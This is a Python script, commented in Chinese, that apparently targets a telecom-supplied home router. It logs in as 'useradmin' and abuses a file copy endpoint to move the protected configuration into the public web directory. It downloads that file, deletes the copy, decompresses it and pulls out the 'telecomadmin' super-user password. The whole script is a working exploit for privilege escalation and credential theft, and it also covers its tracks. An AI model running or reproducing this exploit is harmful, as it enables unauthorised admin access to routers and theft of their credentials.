import requests
import re
import zlib
from io import BytesIO


# 用于解包的压缩文件的函数
def unPack(f: BytesIO):
    next_offset = 60
    block_size = 0
    unpacked_bytes = b''  # output bytes
    while True:
        if next_offset <= 0:  # 最后一个数据块的下一个数据块起始位置为0
            break
        f.seek(next_offset + 4)  # 跳过解压后大小的四个字节 00 01 00 00
        # 压缩数据块大小
        block_size = int.from_bytes(f.read(4), byteorder='big')
        # 下一块Zlib数据块的位置
        next_offset = int.from_bytes(f.read(4), byteorder='big')
        # 解压数据块的数据
        data = f.read(block_size)
        unpacked_bytes += zlib.decompress(data)  # return decompress byteswap   
    return unpacked_bytes


username = "useradmin"
passwd = input("请输入useradmin用户的密码: ")
Host = "http://192.168.1.1"
UrlLogin = Host + "/cgi-bin/luci"
UrlGetToken = Host + "/cgi-bin/luci/"
UrlGetDevInfo = Host + "/cgi-bin/luci/admin/settings/gwinfo?get=all"
UrlExploit = Host + "/cgi-bin/luci/admin/storage/copyMove"
UrlDownCfg = Host + ":8080/db_user_cfg.xml"
UrlDeleteFile = Host + "/cgi-bin/luci/admin/storage/deleteFiles"
useragent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
# requests session
session = requests.Session()
# Login using post
r = session.post(UrlLogin, data={"username": username, "psd": passwd}, headers={"User-Agent": useragent})
if r.status_code != 200:
    print('error')
    exit()

# 用正则获取token，用于post表单
p = re.search(r"token: '(\w*)'", r.text)
if p:
    token = p.group(1)  # 找到token
else:
    print('密码错误!')  # token not found
    exit()

# GET device info
r = session.get(UrlGetDevInfo)
dev_info = r.json()
print('\n登录成功，成功获取设备信息!')
print('设备类型:  ', dev_info['DevType'])
print('产品型号:  ', dev_info['ProductCls'])
print('产品序列号:', dev_info['ProductSN'])
print('软件版本号:', dev_info['SWVer'])
print('MAC地址:   ', dev_info['MAC'], '\n')

# 将配置文件复制到httpd的目录下
payload = {'opstr': 'copy|//userconfig/cfg|/home/httpd/public|db_user_cfg.xml', 'fileLists': 'db_user_cfg.xml/'}
r = session.get(UrlExploit, params=payload)

# 从httpd目录下载文件
r = session.get(UrlDownCfg)

# 将原始配置文件保存到本地
data_bytes = b''
filename = 'db_user_cfg.xml'
with open(filename, 'wb') as fd:
    for chunk in r.iter_content(chunk_size=128):
        fd.write(chunk)
        data_bytes += chunk
print("已将原始配置文件保存到本地 db_user_cfg.xml")

# 清空路由器httpd中文件
payload = {'token': token, 'path': '//home/httpd/public', 'fileLists': 'db_user_cfg.xml/'}
r = session.post(UrlDeleteFile, data=payload)

# 构建BytesIO
f = BytesIO(data_bytes)
# 解包
cracked_bytes = unPack(f)

with open('db_user_cfg_cracked.xml', 'wb') as f:
    f.write(cracked_bytes)
    print("已将解压后的配置文件保存到本地 db_user_cfg_cracked.xml\n")

pattern = r'<DM name="User" val="telecomadmin"/>\n<DM name="Pass" val="(\w+)"/>'
p = re.search(pattern, cracked_bytes.decode())  # 用正则表达式，搜索解密的字符串
if p:
    super_password = p.group(1)
    print('Success!')
    print('超级用户: telecomadmin')
    print('超级密码: ', super_password)
else:
    print("未找到超级用户密码T_T")
